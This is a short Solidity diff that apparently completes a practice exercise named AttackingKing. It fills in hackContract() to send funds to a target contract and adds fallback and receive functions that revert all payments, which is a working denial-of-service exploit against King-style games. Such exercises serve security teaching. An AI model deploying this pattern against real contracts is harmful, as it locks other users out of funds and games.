@@ -11,6 +11,14 @@ contract AttackingKing {
     }
 
     function hackContract() external {
-        // Code me!
+        payable(contractAddress).call{value: address(this).balance}("");
+    }
+
+    fallback() external payable {
+        revert("This contract does not accept payments");
+    }
+
+    receive() external payable {
+        revert("This contract does not accept payments");
     }
 }
